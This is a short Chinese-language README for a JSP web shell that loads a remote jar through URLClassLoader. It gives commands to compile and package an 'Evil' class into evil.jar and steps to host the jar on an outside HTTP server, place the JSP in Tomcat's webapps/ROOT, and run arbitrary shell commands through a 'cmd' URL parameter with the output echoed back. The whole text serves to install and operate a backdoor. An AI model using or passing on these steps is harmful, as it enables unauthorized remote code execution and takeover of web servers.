### URLClassLoader加载远程jar的JSP WebShell

编译打包jar：
```
javac Evil.java
jar -cvf evil.jar Evil.class
```

使用：
```
1.把evil.jar放到可被访问的HTTP服务器，例：http://1.1.1.1:23232/evil.jar

2.修改evil.jar加载jar的url

3.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

4.在浏览器访问4.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/4.jsp?cmd=whoami

5.服务器将会执行相应的shell命令，最后回显
```